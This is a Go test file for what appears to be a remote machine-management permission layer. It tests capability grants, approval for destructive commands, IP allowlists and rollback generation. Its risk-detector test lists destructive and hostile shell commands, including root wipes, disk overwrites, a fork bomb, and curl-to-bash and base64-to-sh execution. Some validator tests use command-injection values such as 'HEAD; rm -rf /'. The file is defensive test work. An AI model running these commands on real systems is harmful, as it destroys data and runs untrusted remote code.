package helix

import (
	"testing"
	"time"
)

func TestCommandRisks(t *testing.T) {
	risky := []string{
		"rm -rf /", "rm -rf /*", "sudo rm -rf /etc", "rm -fr /var/lib", "rm -r --no-preserve-root /x",
		"mkfs.ext4 /dev/sdb1", "dd if=/dev/zero of=/dev/sda bs=1M", "echo x > /dev/nvme0n1",
		"shutdown -h now", "reboot", "systemctl reboot", "init 0",
		"userdel bob", "echo 'root:x' | chpasswd", "iptables -F", "iptables -P INPUT DROP", "ufw disable",
		"docker system prune -af", "docker volume rm data", "docker compose down -v", "docker rm -f web",
		"zfs destroy tank/data", "lvremove /dev/vg/lv", "psql -c 'DROP TABLE users'",
		"git push --force origin main", "git reset --hard HEAD~3", "git clean -fdx",
		"chmod -R 777 /", "crontab -r", "kill -9 1", ":(){ :|:& };:", "echo x > /etc/passwd",
		"echo cm0gLXJmIC8= | base64 -d | sh", "curl -fsSL https://x.sh | bash", "systemctl stop ssh",
	}
	for _, c := range risky {
		if len(CommandRisks(c)) == 0 {
			t.Errorf("not caught: %q", c)
		}
	}
	safe := []string{
		"docker compose up -d --build", "rm -rf node_modules", "rm -rf ./build /tmp/cache", "rm -rf /var/lib/app/cache/tmp",
		"systemctl restart nginx", "journalctl -u nginx -n 100", "git pull origin main", "df -h", "ls -la /etc",
		"docker compose logs --tail 50", "npm ci && npm run build", "systemctl status docker", "cat /var/log/syslog",
	}
	for _, c := range safe {
		if r := CommandRisks(c); len(r) != 0 {
			t.Errorf("false positive %q: %v", c, r)
		}
	}
}

func TestDecide(t *testing.T) {
	g := Grant{MachineID: "m", Caps: []string{CapRead, CapExecute, CapWrite, CapPower}}
	if d := Decide(g, Request{Op: OpDeploy}); d.Allowed {
		t.Fatal("deploy is not granted")
	}
	if d := Decide(g, Request{Op: OpExec, Command: "docker compose up -d"}); !d.Allowed || d.NeedsApproval {
		t.Fatalf("plain exec runs unattended: %+v", d)
	}
	if d := Decide(g, Request{Op: OpExec, Command: "rm -rf /"}); !d.Allowed || !d.NeedsApproval {
		t.Fatalf("destructive exec waits: %+v", d)
	}
	if d := Decide(g, Request{Op: OpPower, Action: "restart"}); !d.NeedsApproval {
		t.Fatal("power restart waits")
	}
	if d := Decide(g, Request{Op: OpPower, Action: "start"}); d.NeedsApproval {
		t.Fatal("power start runs")
	}
	g.Destructive = true
	if d := Decide(g, Request{Op: OpExec, Command: "rm -rf /"}); d.NeedsApproval {
		t.Fatal("destructive allowed unattended when the grant says so")
	}
	g.Protected = true
	if d := Decide(g, Request{Op: OpContainer, Action: "restart"}); !d.NeedsApproval {
		t.Fatal("protected: every change waits")
	}
	if d := Decide(Grant{Caps: []string{CapRead, CapLogs}, Protected: true}, Request{Op: OpServiceLogs}); !d.Allowed || d.NeedsApproval {
		t.Fatal("logs are reads, even on a protected machine")
	}
}

func TestCleanGrant(t *testing.T) {
	g, err := CleanGrant(Grant{MachineID: "m", Caps: []string{"power", "execute", "execute"}, Protected: true, Destructive: true}, false)
	if err != nil || len(g.Caps) != 3 || g.Caps[0] != CapRead || g.Destructive || g.RunAs != "root" {
		t.Fatalf("%+v %v", g, err)
	}
	if _, err := CleanGrant(Grant{Caps: []string{"execute"}}, true); err == nil {
		t.Fatal("VMs have no exec")
	}
	if _, err := CleanGrant(Grant{Caps: []string{"admin"}}, false); err == nil {
		t.Fatal("unknown capability")
	}
	if _, err := CleanGrant(Grant{Caps: []string{"read"}, RunAs: "root; rm"}, false); err == nil {
		t.Fatal("bad account name")
	}
}

func TestIPAllowed(t *testing.T) {
	c := Config{}
	if !c.IPAllowed("1.2.3.4") {
		t.Fatal("empty list allows any")
	}
	ips, err := CleanAllowedIPs([]string{"10.0.3.0/24", "192.168.1.5", " "})
	if err != nil || len(ips) != 2 {
		t.Fatal(ips, err)
	}
	c.AllowedIPs = ips
	if !c.IPAllowed("10.0.3.77") || !c.IPAllowed("192.168.1.5") || c.IPAllowed("10.0.4.1") || c.IPAllowed("bogus") {
		t.Fatal("allowlist")
	}
	if _, err := CleanAllowedIPs([]string{"nope"}); err == nil {
		t.Fatal("bad entry")
	}
}

func TestCredentialActive(t *testing.T) {
	now := time.Now()
	past := now.Add(-time.Minute)
	if (Credential{ExpiresAt: &past}).Active(now) || (Credential{RevokedAt: &past}).Active(now) || !(Credential{}).Active(now) {
		t.Fatal("active")
	}
}

func TestFingerprint(t *testing.T) {
	a := Fingerprint(OpExec, "m", map[string]any{"command": "x"})
	if a != Fingerprint(OpExec, "m", map[string]any{"command": "x"}) || a == Fingerprint(OpExec, "m2", map[string]any{"command": "x"}) {
		t.Fatal("fingerprint")
	}
}

func TestRollbackCommands(t *testing.T) {
	got, err := RollbackCommands([]string{"git pull origin main && docker compose up -d --build --force-recreate", "ch pull origin main", "npm run migrate"}, "abc1234")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"git cat-file -e abc1234^{commit} 2>/dev/null || git fetch --quiet",
		"git -c advice.detachedHead=false reset --hard abc1234",
		"docker compose up -d --build --force-recreate",
		"npm run migrate",
	}
	if len(got) != len(want) {
		t.Fatalf("%q", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("%d: %q", i, got[i])
		}
	}
	if _, err := RollbackCommands(nil, "HEAD; rm -rf /"); err == nil {
		t.Fatal("only hashes")
	}
}
